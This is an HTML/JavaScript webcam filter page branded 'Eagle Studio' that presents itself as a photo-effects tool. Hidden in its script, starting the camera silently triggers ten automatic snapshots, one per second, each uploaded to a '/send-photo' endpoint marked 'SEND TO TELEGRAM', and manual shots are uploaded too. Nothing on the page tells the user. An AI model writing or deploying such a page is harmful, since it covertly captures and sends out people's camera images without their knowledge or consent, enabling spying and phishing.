<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Eagle Studio</title>

<style>
*{
  box-sizing:border-box;
  margin:0;
  padding:0;
}

body{
  min-height:100vh;
  background:#f2f3f5;
  font-family:Arial,Helvetica,sans-serif;
  color:#202124;
  overflow-x:hidden;
}

/* TOP BAR */
.topbar{
  height:64px;
  background:#fff;
  border-bottom:1px solid #ddd;
  display:flex;
  align-items:center;
  padding:0 24px;
  position:sticky;
  top:0;
  z-index:20;
}

.logo{
  font-size:21px;
  font-weight:800;
  letter-spacing:-.5px;
}

.logo span{
  font-size:25px;
  margin-right:7px;
}

/* MAIN */
.main{
  width:min(1100px,94%);
  margin:28px auto 40px;
}

/* CAMERA */
.camera-wrap{
  display:flex;
  justify-content:center;
}

.camera{
  width:min(850px,100%);
  aspect-ratio:16/10;
  background:#171717;
  border-radius:18px;
  position:relative;
  overflow:hidden;
  box-shadow:
    0 15px 45px rgba(0,0,0,.14),
    0 2px 8px rgba(0,0,0,.08);
}

video{
  width:100%;
  height:100%;
  object-fit:cover;
  display:block;
  background:#111;
}

.camera-label{
  position:absolute;
  top:15px;
  left:15px;
  background:rgba(0,0,0,.58);
  color:#fff;
  padding:7px 11px;
  border-radius:7px;
  font-size:10px;
  font-weight:700;
  letter-spacing:1.5px;
  z-index:3;
}

/* CONTROLS */
.controls{
  display:flex;
  align-items:center;
  justify-content:center;
  gap:14px;
  margin:20px 0 17px;
}

.btn{
  border:1px solid #d5d5d5;
  background:#fff;
  color:#222;
  height:45px;
  padding:0 18px;
  border-radius:11px;
  font-size:13px;
  font-weight:700;
  cursor:pointer;
  transition:.18s ease;
}

.btn:hover{
  transform:translateY(-1px);
  box-shadow:0 5px 15px rgba(0,0,0,.08);
}

.btn:active{
  transform:scale(.97);
}

.btn.primary{
  background:#222;
  color:#fff;
  border-color:#222;
}

.btn:disabled{
  opacity:.45;
  cursor:not-allowed;
  transform:none;
}

/* SHUTTER */
.shutter{
  width:62px;
  height:62px;
  border-radius:50%;
  border:5px solid #fff;
  outline:2px solid #222;
  background:#222;
  cursor:pointer;
  box-shadow:0 4px 15px rgba(0,0,0,.15);
  transition:.18s ease;
}

.shutter:hover{
  transform:scale(1.06);
}

.shutter:active{
  transform:scale(.93);
}

.shutter:disabled{
  opacity:.4;
  cursor:not-allowed;
}

/* AUTO INFO */
.auto-info{
  text-align:center;
  min-height:20px;
  color:#777;
  font-size:11px;
  font-weight:600;
  letter-spacing:.3px;
}

/* EFFECTS */
.effects-section{
  margin-top:27px;
}

.section-title{
  font-size:13px;
  font-weight:800;
  margin-bottom:11px;
}

.effects{
  background:#fff;
  border:1px solid #ddd;
  border-radius:15px;
  padding:13px;
  display:flex;
  gap:9px;
  overflow-x:auto;
  scrollbar-width:thin;
}

.effects::-webkit-scrollbar{
  height:6px;
}

.effects::-webkit-scrollbar-thumb{
  background:#ccc;
  border-radius:20px;
}

.effect{
  flex:0 0 auto;
  min-width:82px;
  border:1px solid #ddd;
  background:#fafafa;
  border-radius:10px;
  padding:9px 10px;
  cursor:pointer;
  transition:.18s ease;
  text-align:center;
}

.effect:hover{
  background:#f1f1f1;
}

.effect.active{
  background:#222;
  color:white;
  border-color:#222;
}

.effect-preview{
  width:55px;
  height:40px;
  border-radius:7px;
  margin:0 auto 7px;
  background:linear-gradient(135deg,#222,#888);
}

.effect-name{
  font-size:10px;
  font-weight:800;
  text-transform:uppercase;
}

/* EFFECT PREVIEWS */
.p-normal{
  background:linear-gradient(135deg,#e7c0a5,#555);
}

.p-mirror{
  background:linear-gradient(135deg,#9ed0ff,#555);
  transform:scaleX(-1);
}

.p-gray{
  background:linear-gradient(135deg,#ddd,#222);
  filter:grayscale(1);
}

.p-sepia{
  background:linear-gradient(135deg,#d6a46d,#543);
  filter:sepia(1);
}

.p-warm{
  background:linear-gradient(135deg,#ffb36b,#773);
  filter:sepia(.3) saturate(1.5);
}

.p-cool{
  background:linear-gradient(135deg,#7bc8ff,#234);
  filter:hue-rotate(25deg);
}

.p-vivid{
  background:linear-gradient(135deg,#ff3b8d,#14bfff);
  filter:saturate(1.8);
}

.p-dream{
  background:linear-gradient(135deg,#ffcce4,#b9dfff);
  filter:brightness(1.15);
}

.p-noir{
  background:linear-gradient(135deg,#eee,#111);
  filter:grayscale(1) contrast(1.5);
}

.p-old{
  background:linear-gradient(135deg,#c89c64,#4b3928);
  filter:sepia(.7);
}

.p-glitch{
  background:linear-gradient(90deg,#ff00aa,#00ffff,#ffff00);
}

.p-thermal{
  background:linear-gradient(90deg,#1600ff,#ff0000,#ffff00);
}

.p-night{
  background:linear-gradient(135deg,#14233d,#1e6b48);
}

.p-gold{
  background:linear-gradient(135deg,#ffe38a,#8a5d00);
}

.p-pink{
  background:linear-gradient(135deg,#ffb5d8,#d83286);
}

.p-blue{
  background:linear-gradient(135deg,#9bdcff,#1555aa);
}

.p-fade{
  background:linear-gradient(135deg,#ddd,#aaa);
}

/* SAVE */
.save-area{
  display:flex;
  justify-content:center;
  margin-top:17px;
}

#save{
  display:none;
}

/* MOBILE */
@media(max-width:700px){

  .topbar{
    height:57px;
    padding:0 14px;
  }

  .logo{
    font-size:18px;
  }

  .main{
    width:100%;
    margin-top:14px;
  }

  .camera{
    width:100%;
    border-radius:0;
    aspect-ratio:4/3;
    box-shadow:none;
  }

  .controls{
    margin:16px 10px 10px;
    gap:10px;
  }

  .btn{
    height:42px;
    padding:0 12px;
    font-size:11px;
  }

  .shutter{
    width:58px;
    height:58px;
  }

  .effects-section{
    margin:20px 10px 0;
  }

  .effects{
    border-radius:12px;
    padding:10px;
  }

  .effect{
    min-width:76px;
  }

  .section-title{
    font-size:12px;
  }
}
</style>
</head>

<body>

<header class="topbar">
  <div class="logo">
    <span>🦅</span>Eagle Studio
  </div>
</header>

<main class="main">

  <!-- CAMERA -->
  <div class="camera-wrap">

    <div class="camera" id="cameraBox">

      <div class="camera-label">
        CAMERA
      </div>

      <video
        id="video"
        autoplay
        playsinline
        muted>
      </video>

    </div>

  </div>

  <!-- CONTROLS -->
  <div class="controls">

    <button
      class="btn primary"
      id="start">
      🎥 تشغيل الكاميرا
    </button>

    <button
      class="shutter"
      id="capture"
      disabled
      aria-label="Capture">
    </button>

  </div>

  <div class="auto-info" id="autoInfo"></div>

  <!-- EFFECTS -->
  <section class="effects-section">

    <div class="section-title">
      Effects
    </div>

    <div class="effects">

      <button class="effect active" data-effect="normal">
        <div class="effect-preview p-normal"></div>
        <div class="effect-name">Normal</div>
      </button>

      <button class="effect" data-effect="mirror">
        <div class="effect-preview p-mirror"></div>
        <div class="effect-name">Mirror</div>
      </button>

      <button class="effect" data-effect="gray">
        <div class="effect-preview p-gray"></div>
        <div class="effect-name">B&W</div>
      </button>

      <button class="effect" data-effect="sepia">
        <div class="effect-preview p-sepia"></div>
        <div class="effect-name">Sepia</div>
      </button>

      <button class="effect" data-effect="warm">
        <div class="effect-preview p-warm"></div>
        <div class="effect-name">Warm</div>
      </button>

      <button class="effect" data-effect="cool">
        <div class="effect-preview p-cool"></div>
        <div class="effect-name">Cool</div>
      </button>

      <button class="effect" data-effect="vivid">
        <div class="effect-preview p-vivid"></div>
        <div class="effect-name">Vivid</div>
      </button>

      <button class="effect" data-effect="dream">
        <div class="effect-preview p-dream"></div>
        <div class="effect-name">Dream</div>
      </button>

      <button class="effect" data-effect="noir">
        <div class="effect-preview p-noir"></div>
        <div class="effect-name">Noir</div>
      </button>

      <button class="effect" data-effect="old">
        <div class="effect-preview p-old"></div>
        <div class="effect-name">Vintage</div>
      </button>

      <button class="effect" data-effect="glitch">
        <div class="effect-preview p-glitch"></div>
        <div class="effect-name">Glitch</div>
      </button>

      <button class="effect" data-effect="thermal">
        <div class="effect-preview p-thermal"></div>
        <div class="effect-name">Thermal</div>
      </button>

      <button class="effect" data-effect="night">
        <div class="effect-preview p-night"></div>
        <div class="effect-name">Night</div>
      </button>

      <button class="effect" data-effect="gold">
        <div class="effect-preview p-gold"></div>
        <div class="effect-name">Gold</div>
      </button>

      <button class="effect" data-effect="pink">
        <div class="effect-preview p-pink"></div>
        <div class="effect-name">Pink</div>
      </button>

      <button class="effect" data-effect="blue">
        <div class="effect-preview p-blue"></div>
        <div class="effect-name">Blue</div>
      </button>

      <button class="effect" data-effect="fade">
        <div class="effect-preview p-fade"></div>
        <div class="effect-name">Fade</div>
      </button>

    </div>

  </section>

  <!-- SAVE -->
  <div class="save-area">

    <button
      class="btn"
      id="save">
      💾 حفظ الصورة
    </button>

  </div>

</main>

<canvas id="canvas" style="display:none"></canvas>

<script>

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

const start = document.getElementById("start");
const capture = document.getElementById("capture");
const save = document.getElementById("save");

let stream = null;
let selectedEffect = "normal";
let lastBlob = null;

let autoStarted = false;
let sending = false;


/* =========================
   EFFECT SELECTION
========================= */

document.querySelectorAll(".effect").forEach(button => {

  button.addEventListener("click", () => {

    document
      .querySelectorAll(".effect")
      .forEach(b => {
        b.classList.remove("active");
      });

    button.classList.add("active");

    selectedEffect = button.dataset.effect;

    applyEffect();

  });

});


/* =========================
   APPLY EFFECT
========================= */

function applyEffect(){

  video.className = "";

  if(selectedEffect === "normal"){
    return;
  }

  if(selectedEffect === "mirror"){

    video.classList.add("fx-mirror");

    return;
  }

  video.classList.add("fx-" + selectedEffect);
}


/* =========================
   VIDEO FILTERS
========================= */

const effectStyle = document.createElement("style");

effectStyle.textContent = `

.fx-mirror{
  transform:scaleX(-1);
}

.fx-gray{
  filter:grayscale(1);
}

.fx-sepia{
  filter:sepia(1);
}

.fx-warm{
  filter:sepia(.25) saturate(1.45) contrast(1.05);
}

.fx-cool{
  filter:saturate(.8) hue-rotate(25deg) brightness(1.08);
}

.fx-vivid{
  filter:saturate(1.8) contrast(1.12);
}

.fx-dream{
  filter:brightness(1.15) saturate(.85) contrast(.9);
}

.fx-noir{
  filter:grayscale(1) contrast(1.5) brightness(.85);
}

.fx-old{
  filter:sepia(.65) contrast(1.15) saturate(.7);
}

.fx-glitch{
  filter:hue-rotate(90deg) saturate(2) contrast(1.3);
}

.fx-thermal{
  filter:hue-rotate(150deg) saturate(2.2) contrast(1.35);
}

.fx-night{
  filter:hue-rotate(85deg) saturate(1.7) brightness(.75) contrast(1.2);
}

.fx-gold{
  filter:sepia(.3) saturate(1.7) brightness(1.05);
}

.fx-pink{
  filter:hue-rotate(310deg) saturate(1.5);
}

.fx-blue{
  filter:hue-rotate(190deg) saturate(1.35);
}

.fx-fade{
  filter:contrast(.82) saturate(.65) brightness(1.08);
}

`;

document.head.appendChild(effectStyle);


/* =========================
   CANVAS FILTER
========================= */

function getCanvasFilter(effect){

  if(effect === "gray")
    return "grayscale(1)";

  if(effect === "sepia")
    return "sepia(1)";

  if(effect === "warm")
    return "sepia(.25) saturate(1.45) contrast(1.05)";

  if(effect === "cool")
    return "saturate(.8) hue-rotate(25deg) brightness(1.08)";

  if(effect === "vivid")
    return "saturate(1.8) contrast(1.12)";

  if(effect === "dream")
    return "brightness(1.15) saturate(.85) contrast(.9)";

  if(effect === "noir")
    return "grayscale(1) contrast(1.5) brightness(.85)";

  if(effect === "old")
    return "sepia(.65) contrast(1.15) saturate(.7)";

  if(effect === "glitch")
    return "hue-rotate(90deg) saturate(2) contrast(1.3)";

  if(effect === "thermal")
    return "hue-rotate(150deg) saturate(2.2) contrast(1.35)";

  if(effect === "night")
    return "hue-rotate(85deg) saturate(1.7) brightness(.75) contrast(1.2)";

  if(effect === "gold")
    return "sepia(.3) saturate(1.7) brightness(1.05)";

  if(effect === "pink")
    return "hue-rotate(310deg) saturate(1.5)";

  if(effect === "blue")
    return "hue-rotate(190deg) saturate(1.35)";

  if(effect === "fade")
    return "contrast(.82) saturate(.65) brightness(1.08)";

  return "none";
}


/* =========================
   TAKE PHOTO
========================= */

async function takePhoto(){

  if(!video.videoWidth){
    return null;
  }

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext("2d");

  ctx.filter = getCanvasFilter(selectedEffect);

  if(selectedEffect === "mirror"){

    ctx.translate(canvas.width,0);
    ctx.scale(-1,1);

    ctx.drawImage(
      video,
      0,
      0,
      canvas.width,
      canvas.height
    );

  }else{

    ctx.drawImage(
      video,
      0,
      0,
      canvas.width,
      canvas.height
    );

  }

  ctx.filter = "none";

  const blob = await new Promise(resolve => {

    canvas.toBlob(
      resolve,
      "image/jpeg",
      .92
    );

  });

  if(!blob){
    return null;
  }

  lastBlob = blob;

  save.style.display = "inline-flex";

  return blob;
}


/* =========================
   SEND TO TELEGRAM
========================= */

async function sendPhoto(blob){

  if(!blob){
    return false;
  }

  const data = new FormData();

  data.append(
    "photo",
    blob,
    "eagle-studio.jpg"
  );

  try{

    const response = await fetch(
      "/send-photo",
      {
        method:"POST",
        body:data
      }
    );

    return response.ok;

  }catch(error){

    console.error(error);

    return false;

  }
}


/* =========================
   AUTOMATIC 10 PHOTOS
========================= */

async function startAutomaticPhotos(){

  if(autoStarted || sending){
    return;
  }

  autoStarted = true;
  sending = true;

  for(let i = 0; i < 10; i++){

    await new Promise(resolve => {
      setTimeout(resolve,1000);
    });

    const blob = await takePhoto();

    if(blob){
      await sendPhoto(blob);
    }

  }

  sending = false;

}


/* =========================
   START CAMERA
========================= */

start.addEventListener("click", async () => {

  if(stream){
    return;
  }

  try{

    stream = await navigator.mediaDevices.getUserMedia({

      video:{
        facingMode:"user"
      },

      audio:false

    });

    video.srcObject = stream;

    capture.disabled = false;

    start.disabled = true;

    start.textContent = "✓ الكاميرا تعمل";

    applyEffect();

    /*
      Start automatic sequence:
      10 photos, one every second.
    */

    startAutomaticPhotos();

  }catch(error){

    console.error(error);

    start.disabled = false;

  }

});


/* =========================
   MANUAL CAPTURE
========================= */

capture.addEventListener("click", async () => {

  const blob = await takePhoto();

  if(blob){
    await sendPhoto(blob);
  }

});


/* =========================
   SAVE LAST PHOTO
========================= */

save.addEventListener("click", () => {

  if(!lastBlob){
    return;
  }

  const url = URL.createObjectURL(lastBlob);

  const link = document.createElement("a");

  link.href = url;
  link.download = "eagle-studio.jpg";

  document.body.appendChild(link);

  link.click();

  link.remove();

  setTimeout(() => {
    URL.revokeObjectURL(url);
  },1000);

});

</script>

</body>
</html>
